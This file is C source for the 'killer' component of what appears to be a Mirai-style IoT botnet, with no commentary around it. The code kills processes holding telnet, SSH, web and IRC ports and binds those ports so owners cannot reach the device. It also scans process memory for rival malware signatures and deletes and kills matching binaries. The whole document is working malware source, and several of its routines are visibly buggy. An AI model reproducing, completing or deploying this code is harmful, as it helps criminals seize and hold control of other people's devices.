#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"
int killer_pid = 0, port_killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;

void portkiller_init(void) {
struct sockaddr_in tmp_bind_addr;
int tmp_bind_fd;
    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
        port_killer_pid = fork();
    if(port_killer_pid > 0 || port_killer_pid	== -1)
        return;
    table_unlock_val(TABLE_KILLER_TCP);
    char fd_tcp = table_retrieve_val(TABLE_KILLER_TCP, NULL);
    table_lock_val(TABLE_KILLER_TCP);
    int fd;
    fd = open(fd_tcp, O_RDONLY);
    if (fd == -1)
        return;
    int a;
    int rands = rand() % 999999;
    srand(time(NULL) ^ rands);
    srand(time(NULL));
    while(TRUE) {
    for( a = 1; a < 65500; a++ ) {
        if( a == getpid() || a == getppid() || a == 36497 || a == 1337 || a == 80 || a == 8080 ) {
    	    continue;//lets skip our port
       } else {
        	killer_kill_by_port(htons(a));
            tmp_bind_addr.sin_port = htons(a);
        	if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
    	    	bind(tmp_bind_fd,  (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
    	    	listen(tmp_bind_fd, 1);
            }
        }
    }
}
}

void port_killer_kill(void) {
    kill(port_killer_pid, 9);
}

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;
    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
    killer_kill_by_port(htons(23));
    tmp_bind_addr.sin_port = htons(23);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
    sleep(5);
    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;
    if (!has_exe_access())
    {
#ifdef DEBUG
            printf("[killer] Machine does not have /proc/$pid/exe\n");
#endif
        return;
    }
#ifdef DEBUG
        printf("[killer] Memory scanning processes\n");
#endif

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;
        killer_kill_by_port(htons(48101));
        killer_kill_by_port(htons(1991));
        killer_kill_by_port(htons(1338));
        killer_kill_by_port(htons(80));
        killer_kill_by_port(htons(1982));
        killer_kill_by_port(htons(2048));
        killer_kill_by_port(htons(443));
        killer_kill_by_port(htons(4321));
        killer_kill_by_port(htons(6667));
        killer_kill_by_port(htons(6697));
        killer_kill_by_port(htons(23));
        killer_kill_by_port(htons(22));
        killer_kill_by_port(htons(53413));
        killer_kill_by_port(htons(80));
        killer_kill_by_port(htons(52869));
        killer_kill_by_port(htons(37215));
        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n");
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;
            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);
            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef DEBUG
                        printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);
            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));
            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0;
                table_unlock_val(TABLE_KILLER_ANIME);
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
    #ifdef DEBUG
                printf("[killer] Memory scan match for binary %s\n", exe_path);
    #endif
                kill(pid, 9);
            } 
            
            if (upx_scan_match(exe_path, status_path))
            {
#ifdef DEBUG
                printf("[killer] UPX scan match for binary %s\n", exe_path);
#endif
                kill(pid, 9);
            }

            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);
    if (util_strlen(inode) == 0)
    {
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        return 0;
    }
    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
            if (*pid < '0' || *pid > '9')
                continue;
            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));
            if (readlink(path, exe, PATH_MAX) == -1)
                continue;
            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;
                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
    sleep(1);
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;
    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }
    util_zero(path, ptr_path - path);
    return TRUE;
}
static BOOL status_upx_check(char *exe_path, char *status_path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_str1, *m_str2, *m_str3, *m_str4, *m_str5, *m_str6, *m_str7, *m_str8, *m_str9;
    int m_str1_len, m_str2_len, m_str3_len, m_str4_len, m_str5_len, m_str6_len, m_str7_len, m_str8_len, m_str9_len;
    BOOL found = FALSE;
    if ((fd = open(exe_path, O_RDONLY)) != -1)
    {
        close(fd);
        return FALSE;
    }
    if ((fd = open(status_path, O_RDONLY)) == -1)
        return FALSE;
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_str1, m_str1_len) ||
            mem_exists(rdbuf, ret, m_str2, m_str2_len) ||
            mem_exists(rdbuf, ret, m_str3, m_str3_len) ||
            mem_exists(rdbuf, ret, m_str4, m_str4_len) ||
            mem_exists(rdbuf, ret, m_str5, m_str5_len) ||
            mem_exists(rdbuf, ret, m_str6, m_str6_len) ||
            mem_exists(rdbuf, ret, m_str7, m_str7_len) ||
            mem_exists(rdbuf, ret, m_str8, m_str8_len) ||
            mem_exists(rdbuf, ret, m_str9, m_str9_len))
        {
            found = TRUE;
            break;
        }
    }
    //eyy
    close(fd);
    return FALSE;
}
static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_str1, *m_str2, *m_str3, *m_str4, *m_str5, *m_str6, *m_str7, *m_str8, *m_str9;
    int m_str1_len, m_str2_len, m_str3_len, m_str4_len, m_str5_len, m_str6_len, m_str7_len, m_str8_len, m_str9_len;
    BOOL found = FALSE;
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
    table_unlock_val(TABLE_MEM_ROUTE);
    table_unlock_val(TABLE_MEM_RC);
    table_unlock_val(TABLE_MEM_ASSWORD);
    table_unlock_val(TABLE_MEM_DVRHELP);
    table_unlock_val(TABLE_MEM_SHINTO3);
    table_unlock_val(TABLE_MEM_SHINTO5);
    table_unlock_val(TABLE_MEM_JOSHO1);
    table_unlock_val(TABLE_MEM_JOSHO2);
    table_unlock_val(TABLE_MEM_UPX);

    m_str1 = table_retrieve_val(TABLE_MEM_ROUTE, &m_str1_len);
    m_str2 = table_retrieve_val(TABLE_MEM_RC, &m_str2_len);
    m_str3 = table_retrieve_val(TABLE_MEM_ASSWORD, &m_str3_len);
    m_str4 = table_retrieve_val(TABLE_MEM_DVRHELP, &m_str4_len);
    m_str5 = table_retrieve_val(TABLE_MEM_SHINTO3, &m_str5_len);
    m_str6 = table_retrieve_val(TABLE_MEM_SHINTO5, &m_str6_len);
    m_str7 = table_retrieve_val(TABLE_MEM_JOSHO1, &m_str7_len);
    m_str8 = table_retrieve_val(TABLE_MEM_JOSHO2, &m_str8_len);
    m_str9 = table_retrieve_val(TABLE_MEM_UPX, &m_str9_len);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_str1, m_str1_len) ||
            mem_exists(rdbuf, ret, m_str2, m_str2_len) ||
            mem_exists(rdbuf, ret, m_str3, m_str3_len) ||
            mem_exists(rdbuf, ret, m_str4, m_str4_len) ||
            mem_exists(rdbuf, ret, m_str5, m_str5_len) ||
            mem_exists(rdbuf, ret, m_str6, m_str6_len) ||
            mem_exists(rdbuf, ret, m_str7, m_str7_len) ||
            mem_exists(rdbuf, ret, m_str8, m_str8_len) ||
            mem_exists(rdbuf, ret, m_str9, m_str9_len))
        {
            found = TRUE;
            break;
        }
    }
    table_lock_val(TABLE_MEM_ROUTE);
    table_lock_val(TABLE_MEM_RC);
    table_lock_val(TABLE_MEM_ASSWORD);
    table_lock_val(TABLE_MEM_DVRHELP);
    table_lock_val(TABLE_MEM_SHINTO3);
    table_lock_val(TABLE_MEM_SHINTO5);
    table_lock_val(TABLE_MEM_JOSHO1);
    table_lock_val(TABLE_MEM_JOSHO2);
    table_lock_val(TABLE_MEM_UPX);
    
    close(fd);
    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;
    if (str_len > buf_len)
        return FALSE;
    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }
    return FALSE;
}
